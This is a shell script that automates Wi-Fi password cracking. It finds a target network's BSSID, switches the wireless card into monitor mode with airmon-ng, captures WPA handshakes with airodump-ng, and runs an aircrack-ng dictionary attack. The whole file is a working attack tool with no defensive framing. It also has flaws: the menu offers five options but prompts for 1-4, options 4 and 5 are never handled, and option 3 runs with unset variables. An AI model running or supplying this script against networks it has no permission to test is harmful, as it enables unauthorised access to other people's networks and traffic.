#!/bin/sh

# Getting wireless device.
get_device(){
	ifconfig | awk '/^w(\w+):+\s+flags/ {gsub(":", "", $1); print $1}'
}

get_bssid(){
	nmcli -f SSID,BSSID,ACTIVE dev wifi list | grep $1 | awk '/\w+\s+(\w+)/ {print $2}'
}

service_status(){
	systemctl status $1 | awk '/\s+Active\s*:\s+(\w+)\s+/ {print $2}'
}

crack_handshakes(){
	echo -n "Path to dictionary:"
	read dict
	echo "Started cracking..."
	aircrack-ng -w $dict -b $1 $(ls hs*.cap)
}

capture_handshakes(){
	echo "Capturing handshakes to 'hs' files..."
	sudo airodump-ng -c 1-14 --bssid $bssid -w hs $device"mon" --ignore-negative-one
}

echo -n "Choose an action:
--------------------------------
1) Full wizzard(Default action).
2) Crack handshakes.
3) Capture handshakes.
4) Enable capture mode.
5) Disable capture mode.
[1-4]>";read action

if [ $action = '1' ] ; then
	#active_nm=$(service_status NetworkManager)
	echo -n "SSID:";read ssid
	echo "Starting NM to get BSSID..."
	sudo systemctl start NetworkManager
	bssid=$(get_bssid $ssid)
	echo "$ssid:BSSID=$bssid"
	echo "Stop NM to make device free to use..."
	sudo systemctl stop NetworkManager
	device=$(get_device)
	# Kill all proccesses using device.
	echo "Killing all the proccesses which can to do not let us capture..."
	sudo airmon-ng check kill
	# Start "listening" mode.
	echo "Creating virtual device to capture all the packets..."
	sudo airmon-ng start $device
	echo "Capturing handshake..."
	capture_handshakes
	echo "Closing"
	sudo airmon-ng stop $device"mon"
	echo -n "Should we start NM again?[yn]:"
	read start_nm_again
	if [ $start_nm_again = y ] ; then
		echo "Starting NM..."
		sudo systemctl start NetworkManager
	fi

	echo -n "Should we crack the passwords now?[yn]:"
	read should_crack
	if [ $should_crack = y ] ; then
		crack_handshakes $bssid
	fi

	echo -n "Should we delete captured-packet-files?[yn]:"
	read should_del_packets
	if [ $should_del_packets = y ] ; then
		echo "Deleting packet-files..."
		rm hs* -f
	fi

	exit
fi
if [ $action = '2' ] ; then
	echo -n "BSSID:";read bssid
	crack_handshakes $bssid
	exit
fi
if [ $action = '3' ] ; then
	capture_handshakes
fi
